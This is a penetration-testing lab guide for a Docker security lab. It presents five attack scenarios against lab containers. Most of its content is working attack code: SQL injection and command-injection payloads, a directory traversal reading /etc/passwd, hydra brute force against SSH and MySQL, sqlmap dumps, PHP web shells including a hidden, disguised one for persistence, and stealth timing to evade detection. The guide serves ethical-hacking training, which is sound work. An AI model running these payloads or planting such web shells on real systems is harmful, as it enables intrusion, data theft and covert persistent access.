# Attack Scenarios & Penetration Testing Guide

This guide provides comprehensive attack scenarios for learning ethical hacking and penetration testing using the Docker Security Lab.

## Scenario 1: Web Application Penetration Test

### Objective
Perform a complete security assessment of the vulnerable web application

### Phase 1: Reconnaissance & Information Gathering

#### Network Discovery
```bash
# Connect to security tools container
docker exec -it security-tools bash

# Discover target services
nmap -sn 172.17.0.0/16  # Docker network discovery
nmap -A vulnerable-web  # Aggressive scan of web server

# Service enumeration
nmap -sV -sC vulnerable-web -p 1-65535
```

#### Web Application Fingerprinting
```bash
# Technology identification
nikto -h http://vulnerable-web
whatweb http://vulnerable-web

# Directory enumeration
dirb http://vulnerable-web
dirb http://vulnerable-web /usr/share/dirb/wordlists/common.txt

# Alternative directory brute forcing
gobuster dir -u http://vulnerable-web -w /usr/share/wordlists/dirb/common.txt
```

#### Manual Reconnaissance
```bash
# Check for common files
curl -I http://vulnerable-web/robots.txt
curl -I http://vulnerable-web/.htaccess
curl -I http://vulnerable-web/sitemap.xml
curl -I http://vulnerable-web/admin.php

# Banner grabbing
curl -I http://vulnerable-web
telnet vulnerable-web 80
```

### Phase 2: Vulnerability Assessment

#### Automated Vulnerability Scanning
```bash
# Web vulnerability scanning
nikto -h http://vulnerable-web -o nikto_results.txt
nikto -h http://vulnerable-web -Plugins @@ALL

# Nmap vulnerability scripts
nmap --script http-vuln* vulnerable-web
nmap --script vuln vulnerable-web
```

#### Manual Testing Checklist
```bash
# Test for common vulnerabilities
curl "http://vulnerable-web/?file=../../../etc/passwd"  # Directory traversal
curl "http://vulnerable-web/?ping=1&host=localhost;whoami"  # Command injection
curl -X POST http://vulnerable-web -d "username=admin'OR'1'='1&password=test"  # SQL injection
```

### Phase 3: Exploitation

#### SQL Injection Attack
```bash
# Manual SQL injection testing
curl -X POST http://vulnerable-web \
  -d "username=admin' OR '1'='1-- &password=anything"

# Automated SQL injection with sqlmap
sqlmap -u "http://vulnerable-web" --forms --batch --level=5 --risk=3
sqlmap -u "http://vulnerable-web" --forms --batch --dbs
sqlmap -u "http://vulnerable-web" --forms --batch --tables
sqlmap -u "http://vulnerable-web" --forms --batch --dump
```

#### Command Injection Exploitation
```bash
# Basic command execution
curl "http://vulnerable-web/?ping=1&host=localhost;id"
curl "http://vulnerable-web/?ping=1&host=localhost;uname -a"

# File system exploration
curl "http://vulnerable-web/?ping=1&host=localhost;ls -la /var/www/html"
curl "http://vulnerable-web/?ping=1&host=localhost;find / -name '*.conf' 2>/dev/null"

# Environment disclosure
curl "http://vulnerable-web/?ping=1&host=localhost;env"
curl "http://vulnerable-web/?ping=1&host=localhost;ps aux"
```

#### File Upload Attack
```bash
# Create PHP web shell
cat > webshell.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
EOF

# Upload the shell
curl -F "upload=@webshell.php" http://vulnerable-web/upload.php

# Execute commands
curl "http://vulnerable-web/uploads/webshell.php?cmd=whoami"
curl "http://vulnerable-web/uploads/webshell.php?cmd=ls -la"
```

### Phase 4: Post-Exploitation

#### System Information Gathering
```bash
# Through web shell or command injection
curl "http://vulnerable-web/uploads/webshell.php?cmd=cat /etc/passwd"
curl "http://vulnerable-web/uploads/webshell.php?cmd=cat /proc/version"
curl "http://vulnerable-web/uploads/webshell.php?cmd=df -h"
curl "http://vulnerable-web/uploads/webshell.php?cmd=netstat -tulpn"
```

#### Data Exfiltration
```bash
# Extract sensitive files
curl "http://vulnerable-web/?file=../../../etc/sensitive_config.txt"
curl "http://vulnerable-web/uploads/webshell.php?cmd=find /var/www/html -name '*.txt'"
```

## Scenario 2: Network Service Penetration Test

### Objective
Assess security of network services (SSH, FTP, Database)

### SSH Brute Force Attack

#### Credential Discovery
```bash
# Create wordlists
echo -e "admin\nroot\ntest\nguest\nuser" > users.txt
echo -e "admin\npassword\nroot\ntoor\ntest\nguest\n123456" > passwords.txt

# Brute force attack
hydra -L users.txt -P passwords.txt ssh://vulnerable-ssh:22 -t 4
hydra -l admin -p admin ssh://vulnerable-ssh:22

# Nmap brute force
nmap --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt vulnerable-ssh -p 22
```

#### SSH Exploitation
```bash
# Successful login
ssh admin@vulnerable-ssh -p 22  # password: admin

# Once inside, gather information
whoami
id
uname -a
cat /etc/passwd
ls -la /home/admin/
cat /home/admin/secret.txt
```

### Database Assessment (if available)

#### MySQL Enumeration
```bash
# Check if MySQL is accessible
nmap -sV vulnerable-db -p 3306

# Brute force MySQL credentials
hydra -l root -P passwords.txt mysql://vulnerable-db:3306

# Connect to database
mysql -h vulnerable-db -u root -p  # password: root
```

#### Database Exploitation
```sql
-- Once connected to MySQL
SHOW DATABASES;
USE webapp;
SHOW TABLES;
SELECT * FROM users;
SELECT user, host, authentication_string FROM mysql.user;
```

## Scenario 3: Advanced Persistent Threat (APT) Simulation

### Objective
Simulate a multi-stage attack with persistence and lateral movement

### Stage 1: Initial Compromise
```bash
# Gain initial access via web application
curl -F "upload=@backdoor.php" http://vulnerable-web/upload.php

# Establish persistent web shell
cat > persistent_shell.php << 'EOF'
<?php
set_time_limit(0);
$password = "secret123";
if(isset($_POST['pass']) && $_POST['pass'] == $password) {
    if(isset($_POST['cmd'])) {
        echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
    }
}
?>
<form method="POST">
    Password: <input type="password" name="pass">
    Command: <input type="text" name="cmd">
    <input type="submit" value="Execute">
</form>
EOF
```

### Stage 2: Privilege Escalation
```bash
# Through web shell, attempt privilege escalation
curl -X POST http://vulnerable-web/uploads/persistent_shell.php \
  -d "pass=secret123&cmd=sudo -l"

# Check for SUID binaries
curl -X POST http://vulnerable-web/uploads/persistent_shell.php \
  -d "pass=secret123&cmd=find / -perm -4000 2>/dev/null"
```

### Stage 3: Lateral Movement
```bash
# Scan internal network from compromised web server
curl -X POST http://vulnerable-web/uploads/persistent_shell.php \
  -d "pass=secret123&cmd=nmap -sn 172.17.0.0/16"

# Attempt to access other services
curl -X POST http://vulnerable-web/uploads/persistent_shell.php \
  -d "pass=secret123&cmd=ssh admin@vulnerable-ssh"
```

## Scenario 4: Automated Penetration Testing

### Objective
Use automated tools for comprehensive security assessment

### Comprehensive Nmap Scanning
```bash
# Full TCP port scan
nmap -sS -sV -sC -O -A -T4 -p- vulnerable-web -oA full_scan

# UDP scan for common services
nmap -sU -sV --top-ports 1000 vulnerable-web -oA udp_scan

# Vulnerability assessment
nmap --script vuln vulnerable-web -oA vuln_scan
```

### Web Application Security Testing
```bash
# Comprehensive nikto scan
nikto -h http://vulnerable-web -o nikto_full.txt -Format txt
nikto -h http://vulnerable-web -Plugins @@ALL -o nikto_all_plugins.txt

# Directory brute forcing with multiple wordlists
dirb http://vulnerable-web /usr/share/dirb/wordlists/common.txt -o dirb_common.txt
dirb http://vulnerable-web /usr/share/dirb/wordlists/big.txt -o dirb_big.txt

# SQL injection testing
sqlmap -u "http://vulnerable-web" --forms --batch --level=5 --risk=3 --threads=10
```

### Network Service Assessment
```bash
# SSH security assessment
nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods vulnerable-ssh

# HTTP security headers
nmap --script http-security-headers vulnerable-web

# SSL/TLS assessment (if HTTPS available)
nmap --script ssl-enum-ciphers,ssl-cert vulnerable-web -p 443
```

## Scenario 5: Red Team Exercise

### Objective
Conduct a full red team assessment with stealth and persistence

### Reconnaissance Phase
```bash
# Passive information gathering
nmap -sn 172.17.0.0/16 | grep "Nmap scan report" > live_hosts.txt

# Service discovery with minimal footprint
nmap -sS -T2 --top-ports 100 vulnerable-web

# Banner grabbing
nc vulnerable-web 80 << 'EOF'
HEAD / HTTP/1.1
Host: vulnerable-web

EOF
```

### Exploitation with Stealth
```bash
# Time-delayed attacks to avoid detection
for i in {1..10}; do
    curl -s "http://vulnerable-web/?file=../../../etc/passwd" > /dev/null
    sleep 30
done

# Use legitimate-looking payloads
curl -X POST http://vulnerable-web \
  -d "username=administrator' OR '1'='1'-- &password=password123"
```

### Persistence Mechanisms
```bash
# Create hidden web shell
cat > .system_check.php << 'EOF'
<?php
if($_GET['system'] == 'check') {
    system($_GET['cmd']);
}
?>
EOF

# Upload with innocent filename
curl -F "upload=@.system_check.php" http://vulnerable-web/upload.php
```

## Reporting and Documentation

### Evidence Collection
```bash
# Screenshot evidence (if GUI available)
# Document all successful exploits
# Save all command outputs

# Create comprehensive report structure
mkdir -p report/{reconnaissance,vulnerabilities,exploitation,post-exploitation}

# Save scan results
cp *.txt report/reconnaissance/
cp *.xml report/reconnaissance/
```

### Vulnerability Assessment Report Template
```markdown
# Penetration Testing Report

## Executive Summary
- High-level findings
- Risk assessment
- Business impact

## Technical Findings
### Critical Vulnerabilities
1. SQL Injection in Login Form
   - CVSS Score: 9.8
   - Impact: Complete system compromise
   - Evidence: [screenshots/logs]

### High Vulnerabilities
2. Command Injection in Ping Function
   - CVSS Score: 8.8
   - Impact: Remote code execution

## Recommendations
1. Implement input validation
2. Use parameterized queries
3. Apply security patches
4. Implement WAF
```

### Remediation Verification
```bash
# After fixes are applied, re-test
sqlmap -u "http://vulnerable-web" --forms --batch  # Should fail
curl "http://vulnerable-web/?ping=1&host=localhost;whoami"  # Should be blocked
```

## Learning Objectives Achieved

After completing these scenarios, you should understand:
- Web application security testing methodology
- Network service enumeration and exploitation
- SQL injection techniques and prevention
- Command injection vulnerabilities
- File upload security issues
- Privilege escalation techniques
- Lateral movement in networks
- Persistence mechanisms
- Automated security testing tools
- Report writing and documentation

## Ethical Considerations

**Remember:**
- Only test systems you own or have explicit permission to test
- Document all activities for learning purposes
- Understand the legal implications of security testing
- Use knowledge responsibly for defensive purposes
- Report vulnerabilities through proper channels
